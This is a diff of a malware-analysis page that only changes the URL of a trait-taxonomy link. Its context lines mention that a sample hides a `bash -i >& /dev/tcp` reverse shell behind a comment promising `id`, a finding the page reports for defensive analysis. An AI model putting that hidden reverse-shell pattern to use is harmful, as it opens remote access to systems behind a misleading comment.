@@ -43,7 +43,7 @@ Method 2's comment promises `id`; the call is a `bash -i >& /dev/tcp` reverse sh
 
 ## Traits observed
 
-The [Fallout report](https://lab.atomdrift.org/file/8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e) labels the archive against the [open cleave-traits taxonomy](https://codeberg.org/atomdrift/cleave-traits), with [azoth](/azoth/) returning a malicious verdict at probability 1.0:
+The [Fallout report](https://lab.atomdrift.org/file/8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e) labels the archive against the [open cleave-traits taxonomy](https://github.com/atomdrift-project/traits), with [azoth](/azoth/) returning a malicious verdict at probability 1.0:
 
 |  | Trait | What it caught |
 | --- | --- | --- |
